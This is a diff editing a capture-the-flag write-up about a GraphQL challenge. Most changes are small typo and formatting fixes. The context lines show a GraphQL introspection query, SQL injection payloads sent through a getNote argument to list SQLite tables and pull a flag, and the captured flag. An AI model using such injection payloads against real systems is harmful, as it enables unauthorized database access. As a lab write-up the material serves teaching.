@@ -10,7 +10,7 @@
 ![Graphed Landing Page](images/graphed_landing.png)
 
 On the root path `/`, we get a text input box to submit a note. However, when submitting an alert pops up that says
-`sorry but this functionality is disabeled due to technical problems`.
+`"sorry but this functionality is disabeled due to technical problems"`.
 
 Having a look at the source code there are some commented out rows:
 ```javascript
@@ -23,8 +23,8 @@ function create_note() {
 
 Using the `/graphql` path, we are able to query a database using GraphQL, with the `query` URL argument.
 
-A GraphQL introspection to the following path gives us the all possible queries that can be made to the database:
-```json
+A GraphQL introspection gives us the all possible queries that can be made to the database:
+```
 /graphql?query={ __schema { queryType { fields { name description args { name type {name }}}}}}
 
 Response:
@@ -78,12 +78,12 @@ Response:
 }
 ```
 
-The query `getNote` is the only query without any default count or pagination parameters, having only one parameter `q` that is of type `String`.
+The query `getNote` is the only query without any default count or pagination arguments, having only one argument `q` that is of type `String`.
 
 Lets try using the `getNote` query to inject some SQL code!
 
 Passing our injection code to the argument `q` in `getNote`, we can retrieve all table names and SQL commands used to create every each table. 
-```json
+```
 /graphql?query={ getNote(q: "2' AND 1=2 UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master --") { id }}
 
 Response:
@@ -113,10 +113,10 @@ Response:
 }
 ```
 
-Oddly enough we see a table called `العلم` which in arabic translates to "science". The `science` contain two columns, `id` and `flag`. 
+Oddly enough we see a table called `العلم` which in arabic translates to "`science`". The `science` table contains two columns, `id` and `flag`. 
 
 Querying all rows from the `science` table we get:
-```json
+```
 /graphql?query={ getNote(q: "2' AND 1=2 UNION SELECT id, flag, 1,1 FROM العلم --") { id } }
 
 Response:
@@ -133,7 +133,7 @@ Response:
 }
 ```
 
-Givins us the flag:
+Giving us the flag:
 ```
 flag{h0p3_u_can't_r3@d_1t9176}
 ```
